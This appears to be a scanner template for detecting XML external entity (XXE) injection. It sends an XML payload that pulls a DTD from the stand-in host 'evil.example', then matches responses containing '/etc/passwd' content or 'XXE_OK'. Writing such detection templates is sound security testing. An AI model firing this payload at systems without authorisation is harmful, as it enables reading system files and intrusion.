id: xxe-046
name: 'XXE via xml'
severity: critical
type: active
tags:
  - xxe
  - injection
  - xml
description: 'XXE entity via xml'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      xml:
        - '<!DOCTYPE r PUBLIC "-//X//EN" "http://evil.example/dtd"><r>x</r>'
    matchers:
      - type: word
        part: body
        words:
          - 'root:x:0:0'
          - 'XXE_OK'
